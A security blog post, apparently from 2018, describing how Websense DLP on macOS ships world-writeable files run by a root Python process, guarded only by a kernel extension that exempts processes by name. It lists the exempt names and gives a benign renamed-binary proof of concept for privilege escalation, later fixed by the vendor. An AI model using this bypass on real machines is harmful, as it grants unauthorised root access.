<!doctype html>
<html lang="en">
    <head>
    <meta charset="utf-8">
<meta http-equiv="x-ua-compatible" content="ie=edge">
<title>Websense DLP gives instant root | Die wunderbare Welt von Isotopp</title>
<meta name="description" content="Kris Köhntopp&#39;s blog (Fedi: @isotoppinfosec.exchange)">
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="apple-touch-icon" href="icon.png">
<link rel="icon" href="favicon.ico" type="image/ico">
<link rel="shortcut icon" href="favicon.ico">
<link rel="canonical" href="https://blog.koehntopp.info/2018/06/18/websense-dlp-gives-instant-root.html">

<link rel="alternate" type="application/rss+xml" href='https://blog.koehntopp.info/feed.xml' title="Die wunderbare Welt von Isotopp">
<link rel="alternate" type="application/rss+xml" href='https://blog.koehntopp.info/tags/mysql/feed.xml' title="Feed: mysql Articles for Die wunderbare Welt von Isotopp">
<link rel="alternate" type="application/rss+xml" href='https://blog.koehntopp.info/tags/review/feed.xml' title="Feed: review Articles for Die wunderbare Welt von Isotopp">


<meta name="generator" content="Hugo 0.145.0">
<meta property="og:title" content='Websense DLP gives instant root | Die wunderbare Welt von Isotopp' />
<meta property="og:site_name" content='Die wunderbare Welt von Isotopp' />
<meta property="og:locale" content="en_US" />
<meta name="description" content='Kris Köhntopp&#39;s blog (Fedi: @isotoppinfosec.exchange)' />
<meta property="og:description" content='Kris Köhntopp&#39;s blog (Fedi: @isotoppinfosec.exchange)' />
<meta property="og:url" content="https://blog.koehntopp.info/2018/06/18/websense-dlp-gives-instant-root.html" />
<meta property="og:type" content="article" />
<meta name="article:published_time" content='2018-06-18T20:33:10Z' />
<meta name="fediverse:creator" content="@isotopp@infosec.exchange">
<meta property="og:image" content='https://blog.koehntopp.info/assets/img/background/schloss.jpg' />
<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:creator" content='@isotopp@infosec.exchange' />
<meta property="twitter:title" content='Websense DLP gives instant root' />
<meta property="twitter:description" content='Kris Köhntopp&#39;s blog (Fedi: @isotoppinfosec.exchange)' />
<meta property="twitter:image" content='https://blog.koehntopp.info/assets/img/background/schloss.jpg' />


    



<link rel="stylesheet" href="https://blog.koehntopp.info/style.min.dd9d518fe6cac55191b6af874e18327dff051055754ffc7e106131baf826e6d3.css">


    </head>
    <body>
        

        <nav class="navbar navbar-expand-lg navbar-light px-lg-4 pt-lg-4">
    <div class="container-fluid">
        <a class="navbar-brand justify-content-center" href="https://blog.koehntopp.info/" rel="home" title="Die wunderbare Welt von Isotopp">
            <img alt="Kris" height='48' width='48' src='/assets/img/avatars/isotopp.jpg' class='p-0 me-3 d-block d-lg-inline'>
            <span class='h4 d-block d-lg-inline'>Die wunderbare Welt von Isotopp</span>
        </a>

        <button class="navbar-toggler ms-auto" type="button" data-bs-toggle="collapse"
                data-bs-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false"
                aria-label="Toggle navigation">
            <span class="navbar-toggler-icon"></span>
        </button>

        <div class="collapse navbar-collapse text-center" id="navbarSupportedContent">
            <ul class="navbar-nav ms-auto">
                
                <li class="nav-item ">
                    <a class="nav-link" href="/about/">
                        <span class="">About</span>
                        
                    </a>
                </li>
                <li class="nav-item ">
                    <a class="nav-link" href="/contribute/">
                        <span class="">Contribute</span>
                        
                    </a>
                </li>
                <li class="nav-item ">
                    <a class="nav-link" href="/search/">
                        <span class=""><svg class='bi' height='1.5rem' width='1.5rem' fill='currentColor'><use xlink:href='/bootstrap-icons.svg#search'/></svg></span>
                        
                    </a>
                </li>
                <li class="nav-item ">
                    <a class="nav-link" href="/tags/">
                        <span class=""><svg class='bi' width='1.5rem' height='1.5rem' fill='currentColor'><use xlink:href='/bootstrap-icons.svg#tags-fill'/></svg></span>
                        
                    </a>
                </li>
                
            </ul>
            
        </div>

    </div>
</nav>


        <main role="main" class="container-fluid p-0">

            









<div class="page">
	<article class="websense-dlp-gives-instant-root-page">
		<div class='row  justify-content-center text-center my-4 mx-0'>
			<header class="headerbanner">
				<div class='col'>
					<h1 class="title mb-lg-4 text-white">
						Websense DLP gives instant root
					</h1>
					<div class='text-uppercase text-light' style='letter-spacing: 0.1rem;'>
						<img alt='@isotopp@infosec.exchange image' src='/assets/img/avatars/isotopp.jpg' class='me-1 p-0'
						     style='width: 1.9rem; border-radius: 1rem;'>
						<a href="https://infosec.exchange/@isotopp" class='text-light text-decoration-none'>
							Kristian Köhntopp
						</a>
						
						<span class='d-none d-lg-inline'>-</span>
						<div class='d-block d-lg-inline'>June 18, 2018</div>
						
					</div>
				</div>
				
				<img alt='a featured image' src="/assets/img/background/schloss.jpg">
				
			</header>
		</div>

		<div class='row justify-content-center mx-0'>
			<div class='col-lg-4 text-center text-lg-start'>
				
				<div>
					<div class='letter-spacing-01 text-uppercase text-secondary'>
						Previous Post
					</div>
					<a class='text-decoration-none' href="https://blog.koehntopp.info/2018/04/26/harebrained-battletech.html">Harebrained Battletech</a>
				</div>
				
			</div>

			<div class='col-lg-4 text-lg-end mt-5 mt-lg-0 text-center'>
				
				<div>
					<div class='letter-spacing-01 text-uppercase text-secondary'>
						Next Post
					</div>
					<a class='text-decoration-none' href="https://blog.koehntopp.info/2018/07/15/fertig-gelesen-good-taste-isaac-asimov-1976.html">Fertig gelesen: Good Taste</a>
				</div>
				
			</div>
		</div>

		<div class='row justify-content-center mx-0 mt-3 mb-5'>
			<div class="col-lg-8 mb-3">
				
			</div>
			<div class='col-lg-8'>
				<p>Enterprise security software is interesting, because in order to do what it does it often uses privilege, but it is also very often written extremely badly.</p>
<p>In <a href="/2017/10/20/aslr.html">ASLR</a>

 we have had a look on the Trend Micro binary on MacOS and found that it is running as root, and with ASLR off. That means we have a privileged process that is being loaded at a fixed address, and that process is parsing random user generated data in order to scan it for viruses. If we manage to find a bug in that code, we have a way to make this privileged process do our bidding – by simply putting a special file into a directory that is being scanned by the virus scanner.</p>
<p>Because ASLR is off, that antivirus process is at the same, fixed address on every machine running the same OS version and Trendmicro version. This means: our bug works the same way on every single machine with these properties. We basically control the entire fleet of machines at once.</p>
<p>Such thoughts are not hypothetical problems. Let&rsquo;s have a look at another enterprise security product and how that works, for real.</p>
<h2 id="websense-dlp-is-installed-and-it-is-python">
    <a href="#websense-dlp-is-installed-and-it-is-python">
	Websense DLP is installed and it is Python
    </a>
</h2>
<p>So yesterday morning when I came to work, my Macbook Air had crashed.</p>
<p>On Reboot, the jamf installed a bunch of patches and new stuff. I ran the usual fast <a href="https://aide.github.io/" target="_blank" rel="noopener">AIDE</a>

 check I do every morning, and found a bunch of modified system files, among them WebSense DLP as announced by Corporate a while ago.</p>
<p>I found a bunch of files in <code>/Library/Application Support/Websense Endpoint</code> and was immediately fascinated, because apparently this installs a complete version of Python 2.5.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> find . -iname python2<span class="se">\*</span>
</span></span><span class="line"><span class="cl"><span class="go">./EPClassifier/python/bin/python2.5
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="gp">$</span> EPClassifier/python/bin/python2.5
</span></span><span class="line"><span class="cl"><span class="go">Python 2.6.9 (unknown, Feb  7 2017, 00:08:08)
</span></span></span><span class="line"><span class="cl"><span class="go">[GCC 4.2.1 Compatible Apple LLVM 8.0.0 (clang-800.0.34)] on darwin
</span></span></span><span class="line"><span class="cl"><span class="go">Type &#34;help&#34;, &#34;copyright&#34;, &#34;credits&#34; or &#34;license&#34; for more information.
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="gp">&gt;</span>&gt;&gt;
</span></span></code></pre></div><p>Okay, so they lie about that. It’s 2.6.</p>
<p>On the other hand, they deliver their application as a bunch of <code>.pyc</code> (compiled python bytecode) files.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> find  . -iname <span class="se">\*</span>.pyc
</span></span><span class="line"><span class="cl"><span class="go">./EPClassifier/CryptoInterface.pyc
</span></span></span><span class="line"><span class="cl"><span class="go">./EPClassifier/policies/file_detectors/ASMDetector.pyc
</span></span></span><span class="line"><span class="cl"><span class="go">./EPClassifier/policies/file_detectors/CAD_STL.pyc
</span></span></span><span class="line"><span class="cl"><span class="go">...
</span></span></span></code></pre></div><p>We can read that, using <a href="https://github.com/rocky/python-uncompyle6" target="_blank" rel="noopener">uncompyle6</a>

: <code>brew install python3; pip3 install uncompyle6</code>, because I am lazy and don’t want to mess with a venv right here and now.</p>
<p>I’d want that in my path all the time anyway.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="err">$</span> <span class="n">uncompyle6</span> <span class="o">./</span><span class="n">EPClassifier</span><span class="o">/</span><span class="n">policies</span><span class="o">/</span><span class="n">scripts</span><span class="o">/</span><span class="n">pyLogger</span><span class="o">.</span><span class="n">pyc</span>
</span></span><span class="line"><span class="cl"><span class="c1"># uncompyle6 version 3.2.3</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Python bytecode 2.5 (62131)</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Decompiled from: Python 3.7.0 (default, Jul  9 2018, 09:48:45)</span>
</span></span><span class="line"><span class="cl"><span class="c1"># [Clang 9.0.0 (clang-900.0.39.2)]</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Embedded file name: .\pyLogger.py</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">codecs</span><span class="o">,</span> <span class="nn">time</span><span class="o">,</span> <span class="nn">threading</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">PyLogger</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">debugName</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="n">fileName</span><span class="o">=</span><span class="s1">&#39;C:</span><span class="se">\\</span><span class="s1">temp</span><span class="se">\\</span><span class="s1">pyLogger_svm_default_log_file.txt&#39;</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">debugName</span> <span class="o">=</span> <span class="n">debugName</span>
</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">fileName</span> <span class="o">=</span> <span class="n">fileName</span>
</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">myMutex</span> <span class="o">=</span> <span class="n">threading</span><span class="o">.</span><span class="n">Lock</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">debug</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">massage_to_write</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">time_str</span> <span class="o">=</span> <span class="n">time</span><span class="o">.</span><span class="n">strftime</span><span class="p">(</span><span class="s1">&#39;%Y-%m-</span><span class="si">%d</span><span class="s1"> %H-%M-%S&#39;</span><span class="p">,</span> <span class="n">time</span><span class="o">.</span><span class="n">localtime</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">        <span class="n">string_to_write</span> <span class="o">=</span> <span class="s1">&#39;</span><span class="si">%s</span><span class="s1"> pyLogger debug message: </span><span class="si">%s</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="n">time_str</span><span class="p">,</span> <span class="n">massage_to_write</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">myMutex</span><span class="o">.</span><span class="n">acquire</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="n">log_debug_file</span> <span class="o">=</span> <span class="n">codecs</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">fileName</span><span class="p">,</span> <span class="s1">&#39;a&#39;</span><span class="p">,</span> <span class="s1">&#39;utf-16&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">log_debug_file</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">string_to_write</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">log_debug_file</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\r\n</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">log_debug_file</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">myMutex</span><span class="o">.</span><span class="n">release</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="c1"># okay decompiling ./EPClassifier/policies/scripts/pyLogger.pyc</span>
</span></span></code></pre></div><h2 id="its-all-world-writeable-or-is-it">
    <a href="#its-all-world-writeable-or-is-it">
	It&rsquo;s all world-writeable, or is it?
    </a>
</h2>
<p>That’s fun, I thought and then I saw the file permissions.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> ls -l ./EPClassifier/policies/scripts/pyLogger.pyc
</span></span><span class="line"><span class="cl"><span class="go">-rw-rw-rw-  1 root  admin  1130 Nov 14  2017 ./EPClassifier/policies/scripts/pyLogger.pyc
</span></span></span></code></pre></div><p>Is it really a good idea to have system security software installed with world-writeable files?</p>
<p>I asked in our internal security forum, and apparently WebSense has an anti-tampering protection.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> kextstat <span class="p">|</span> grep -v com.apple <span class="p">|</span> awk <span class="s1">&#39;{ print $1, $6 }&#39;</span>
</span></span><span class="line"><span class="cl"><span class="go">Index Name
</span></span></span><span class="line"><span class="cl"><span class="go">15 com.displaylink.driver.DisplayLinkDriver
</span></span></span><span class="line"><span class="cl"><span class="go">91 com.asix.driver.ax88179-178a
</span></span></span><span class="line"><span class="cl"><span class="go">131 com.Cylance.CyProtectDrvOSX
</span></span></span><span class="line"><span class="cl"><span class="go">146 com.websense.endpoint.process.kpi
</span></span></span><span class="line"><span class="cl"><span class="go">147 com.websense.endpoint.process
</span></span></span><span class="line"><span class="cl"><span class="go">148 com.websense.endpoint.dlp
</span></span></span></code></pre></div><p>The number 148, <code>com.websense.endpoint.dlp</code>, is the kernel module that &ldquo;protects&rdquo; these files: As a user or as root, when you try to modify one of the world writeable files, the module intercepts and blocks the call.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">com.websense.endpoint.dlp: [WARNING:ws_anti.c:364] Blocking the attempt to modify or delete /Library/Application Support/Websense Endpoint/EPClassifier/python/lib/python2.5/sqlite3/__init__.py, pid:73968, process:vim, action: 0x4
</span></span></span></code></pre></div><p>Challenge accepted.</p>
<h2 id="a-kext-is-just-code-lets-have-a-look">
    <a href="#a-kext-is-just-code-lets-have-a-look">
	A kext is just code. Let&rsquo;s have a look.
    </a>
</h2>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> <span class="nb">pwd</span>
</span></span><span class="line"><span class="cl"><span class="go">.../Websense Endpoint/DLP/WebsenseEndpointDLP.kext/Contents/MacOS
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="gp">$</span> ls -l
</span></span><span class="line"><span class="cl"><span class="go">total 440
</span></span></span><span class="line"><span class="cl"><span class="go">-rwxr-xr-x  1 kris  staff  223056 Jun  4 23:52 WebsenseEndpointDLP
</span></span></span></code></pre></div><p>That’s the kext, the one which registers itself as <code>com.websense.endpoint.dlp</code> in <code>kextstat</code>.</p>
<p>We can load it into <a href="https://www.hopperapp.com/" target="_blank" rel="noopener">Hopper</a>

. Hopper is a $99 IDAPro Clone with a nice Python API. You can also use the free version of IDApro, or the NSA Ghidra to achieve the same.</p>
<p>Turns out, the kext is delivered with a full symbol table. Here is what you see when you start Hopper, drag the kext into it and click on the symbol that inits the kernel extension:</p>
<p><a href="/uploads/2018/06/hopper-01.jpg"><p class="md__image">
  <img src="/uploads/2018/06/hopper-01.jpg" alt=""  />
</p>

</a>

</p>
<p><em>Initial glance at the kext after loading. We have symbols. That&rsquo;s almost like cheating.</em></p>
<p>There is a tempting call to <code>_ws_anti_tampering_initialize()</code>, but I have learned to do things differently a long time ago. The error message read &ldquo;Blocking the attempt to modify or delete&rdquo;.</p>
<p>That&rsquo;s here:</p>
<p><a href="/uploads/2018/06/hopper-02.jpg"><p class="md__image">
  <img src="/uploads/2018/06/hopper-02.jpg" alt=""  />
</p>

</a>

</p>
<p><em>Two places in vnode_listener_callback_9135</em></p>
<p>We are looking at a vnode listener, which is a type of <a href="https://www.apriorit.com/dev-blog/411-mac-os-x-kauth-listeners" target="_blank" rel="noopener">kauth</a>

 listener, which is a MacOS thing to monitor or block access to files. It’s what all the Cybersnakeoil is using. It’s also what’s making your <code>git checkout</code> slow.</p>
<p>And here is the callback:</p>
<p><a href="/uploads/2018/06/hopper-03.jpg"><p class="md__image">
  <img src="/uploads/2018/06/hopper-03.jpg" alt=""  />
</p>

</a>

</p>
<p><em>Read the highlighted code&hellip;</em></p>
<p>There is little going on here until we hit the highlighted code. You can’t see all of it, but that does not matter.</p>
<p>The code calls <a href="https://developer.apple.com/documentation/kernel/1488959-proc_name?language=objc" target="_blank" rel="noopener">proc_name()</a>

, which gets the current process title in the kernel context. It then compares this name to a list of approved process names.</p>
<p>If there is a match, no blockage happens from the kext.</p>
<p>So, anything called</p>
<ul>
<li>EndPointClassifier</li>
<li>kvoop</li>
<li>CryptoTool</li>
<li>InstallerTools</li>
<li>Websense Endpoint</li>
<li>TRITON AP-ENDPOINT</li>
<li>Websense Endpoint Helper</li>
<li>DLPHelperService</li>
<li>efw_cache_update</li>
<li>installd</li>
<li>installer</li>
<li>rc.deferred_install</li>
<li>shove</li>
<li>Google Chrome</li>
<li>Websense Endpoint RF Notification</li>
</ul>
<p>is approved to bypass the protection afforded by kext 148.</p>
<p>That makes a lot of sense, if you look at it - how are they going to update their code out in the world? Some programs must be allowed to write to it – that&rsquo;s how <code>InstallerTools</code>, <code>CryptoTool</code>, <code>installd</code>, <code>installer</code> and <code>rc.deferred_install</code> as well as <code>shove</code> end up on this list.</p>
<p>The others are likely convenience for Develoeprs that &ldquo;accidentally&rdquo; (through bad development processes) made it out into production code. It&rsquo;s likely that the bad permissions also ended up being shipped the same way – it makes a lot of sense for a developer to have these files world-writeable all the time when they are developing this product.</p>
<p>In any case, other rules in the rest of the kernel still apply, so file permissions still work. But WebSense delivered a bunch of files world-writeable, relying on their kext to protect their application.</p>
<p>They do load these world-writeable files into their python process, which runs as root, and happily execute them. So this is our hook: We overwrite any of these files with our own code, using our own program which we name <code>kvoop</code> (or anything from the list above), and then restart the machine. As it starts up, it loads our code and the box is ours.</p>
<p>We get privilege escalation from local user to system administrator.</p>
<h2 id="we-write-a-proof-of-concept">
    <a href="#we-write-a-proof-of-concept">
	We write a proof-of-concept
    </a>
</h2>
<p>Can I prove that I can circumvent their protection?</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="err">$</span> <span class="n">cat</span> <span class="n">probe</span><span class="p">.</span><span class="n">c</span>
</span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">FILE</span> <span class="o">*</span><span class="n">fp</span> <span class="o">=</span> <span class="nf">fopen</span><span class="p">(</span><span class="s">&#34;version.plist&#34;</span><span class="p">,</span> <span class="s">&#34;w&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">fp</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">perror</span><span class="p">(</span><span class="s">&#34;Can&#39;t fopen</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">       <span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nf">fprintf</span><span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="s">&#34;Hello, world</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">fclose</span><span class="p">(</span><span class="n">fp</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">sleep</span><span class="p">(</span><span class="mi">60</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>This is a slight variation of the “hello world” program: It opens a file version.plist, writes &ldquo;Hello, world&rdquo; to the file, sleeps a minute and exits.</p>
<p>First, expected behavior: Boy meets file, file is world writeable, boy tries to write file, and fails due to the kext doing the kauth thing and interfering.</p>
<p>Hackerterrorcybercyber averted.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> <span class="nb">pwd</span>
</span></span><span class="line"><span class="cl"><span class="go">/Library/Application Support/Websense Endpoint/EPClassifier/python/Resources
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="gp">$</span> ls -l version.plist 
</span></span><span class="line"><span class="cl"><span class="go">-rwxrwxrwx 1 root admin 454 May 26 07:13 version.plist
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="gp">$</span> &gt; version.plist
</span></span><span class="line"><span class="cl"><span class="go">-bash: version.plist: Permission denied
</span></span></span></code></pre></div><p>Boy reverses the kext, reads the list of privileged filenames, names his &ldquo;hello world&rdquo; program kvoop from the list of privileged filenames and lo and behold:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> kvoop
</span></span><span class="line"><span class="cl"><span class="go">^C
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="gp">$</span> cat version.plist
</span></span><span class="line"><span class="cl"><span class="go">Hello, world
</span></span></span></code></pre></div><p>I pwn.</p>
<h2 id="other-observations">
    <a href="#other-observations">
	Other observations
    </a>
</h2>
<p>Websense DLP is one of the kind of products that inject a shared library (a Macos <code>.dylib</code>) into other processes. In our case, Chrome and Firefox are being targeted. This is not a stable interface, and <a href="https://www.techradar.com/news/google-chrome-keeps-crashing-it-might-be-your-antivirus" target="_blank" rel="noopener">Chrome or Firefox may crash</a>

.</p>
<p>Websense DLP relies on the <code>prog_name()</code> not only for exceptions in the kauth handler, but also in the selection of binaries to target for injection. For example, if I write a &ldquo;hello world&rdquo; program and rename it to <code>firefox</code>, there is a lot of commotion in the system log: Websense DLP tries to inject its libraries into my &ldquo;hello world&rdquo; program, which it mistakes for Firefox due to the program name, and fails, noisly.</p>
<p>The same works in reverse: A firefox binary that is not named <code>firefox</code> is not recognized and does not get the shared library injected, so it flies under the radar.</p>
<p>One wonders what the actual threat model is that this is supposed to protect against.</p>
<h2 id="tldr">
    <a href="#tldr">
	TL;DR
    </a>
</h2>
<p>We deployed Websense DLP across all company Macs, and anybody renaming their <code>vim</code> to <code>kvoop</code> can edit the files, which are then loaded into a privileged process and run as root.</p>
<p><em>Websense DLP is an instant root on all Mac machines where it is being deployed.</em></p>
<p><em>Addendum:</em> Security picked up on this, and communicated the problem to the vendor, which then shipped a fix. It is unknown to me if they also fixed their broken security processes. We ceased using the product shortly after that.</p>

			</div>
		</div>

		
		
		<div class='row justify-content-center py-3 mb-3 mx-0'>
			<div class='col-lg-8 text-center'>
				<span class='letter-spacing-01 text-uppercase text-secondary me-2'>Tags</span>
				
				<a href="/tags/#lang_en" class='btn btn-sm btn-outline-primary mb-1'>
				<svg class="bi" width="1rem" height="1rem" fill="currentColor">
					<use xlink:href="/bootstrap-icons.svg#tag-fill"></use>
				</svg>
				lang_en
				</a>
				
				<a href="/tags/#security" class='btn btn-sm btn-outline-primary mb-1'>
				<svg class="bi" width="1rem" height="1rem" fill="currentColor">
					<use xlink:href="/bootstrap-icons.svg#tag-fill"></use>
				</svg>
				security
				</a>
				
				<a href="/tags/#hack" class='btn btn-sm btn-outline-primary mb-1'>
				<svg class="bi" width="1rem" height="1rem" fill="currentColor">
					<use xlink:href="/bootstrap-icons.svg#tag-fill"></use>
				</svg>
				hack
				</a>
				
			</div>
		</div>

		
		
		
		
		<div class='row justify-content-center py-3 mb-3 mx-0'>
			<div class='col-lg-8 text-center'>
				<a href="https://github.com/isotopp/isotopp.github.io/edit/main/content/posts/2018-06-18-websense-dlp-gives-instant-root.md"
				   rel="noopener noreferrer" target="_blank">
					<span class='letter-spacing-01 text-uppercase text-secondary me-2'>Suggest Changes</span>
				</a>
			</div>
		</div>
		

		<div class='row justify-content-center mx-0'>
			<div class='col-lg-4 text-center text-lg-start'>
				
				<div>
					<div class='letter-spacing-01 text-uppercase text-secondary'>
						Previous Post
					</div>
					<a class='text-decoration-none' href="https://blog.koehntopp.info/2018/04/26/harebrained-battletech.html">Harebrained Battletech</a>
				</div>
				
			</div>

			<div class='col-lg-4 text-lg-end mt-5 mt-lg-0 text-center'>
				
				<div>
					<div class='letter-spacing-01 text-uppercase text-secondary'>
						Next Post
					</div>
					<a class='text-decoration-none' href="https://blog.koehntopp.info/2018/07/15/fertig-gelesen-good-taste-isaac-asimov-1976.html">Fertig gelesen: Good Taste</a>
				</div>
				
			</div>
		</div>


		
	</article>
</div>



            <footer class='row justify-content-center mb-4 pb-4 mx-0'>
  <div class='col-8 text-center'>
    <div>
      A collection of old stuff, new stuff and random stuff.
    </div>
    <div class='row text-primary mt-4'>
      <div class='col'>

        <a href='/feed.xml' title='Follow RSS feed' class='me-3 text-decoration-none'>
          <svg class='bi' height='2.5rem' width='2.5rem' fill='currentColor'>
            <use xlink:href='/bootstrap-icons.svg#rss-fill'/>
          </svg>
        </a>

        <a href='mailto:kristian.koehntopp@gmail.com' title='Email' class='me-3 text-decoration-none'>
          <svg class='bi' height='2.5rem' width='2.5rem' fill='currentColor'>
            <use xlink:href='/bootstrap-icons.svg#envelope'/>
          </svg>
        </a>

        <a href='https://github.com/isotopp' title='Follow on GitHub' class='me-3 text-decoration-none'>
          <svg class='bi' height='2.5rem' width='2.5rem' fill='currentColor'>
            <use xlink:href='/bootstrap-icons.svg#github'/>
          </svg>
        </a>

        <a rel="me" href="https://infosec.exchange/@isotopp" title='Follow on Mastodon' class='me-3 text-decoration-none'>
          <svg class='bi' height='2.5rem' width='2.5rem' fill='currentColor'>
            <use xlink:href='/bootstrap-icons.svg#mastodon'/>
          </svg>
        </a>

        
        <a href='http://steamcommunity.com/id/ixotopp' title='Follow on Steam' class='me-3 text-decoration-none'>
          <svg class='bi' height='2.5rem' width='2.5rem' fill='currentColor'>
            <use xlink:href='/bootstrap-icons.svg#steam'/>
          </svg>
        </a>

        

        <a href='https://www.youtube.com/user/isotopp' title='Follow on YouTube' class=''>
          <svg class='bi' height='2.5rem' width='2.5rem' fill='currentColor'>
            <use xlink:href='/bootstrap-icons.svg#youtube'/>
          </svg>
        </a>
      </div>
    </div>
  </div>
</footer>


        </main>

	





<script src="https://blog.koehntopp.info/js/bootstrap.js"></script>




<script src="https://blog.koehntopp.info/js/lunr.js"></script>





<script src="https://blog.koehntopp.info/js/app.js"></script>


    </body>
</html>
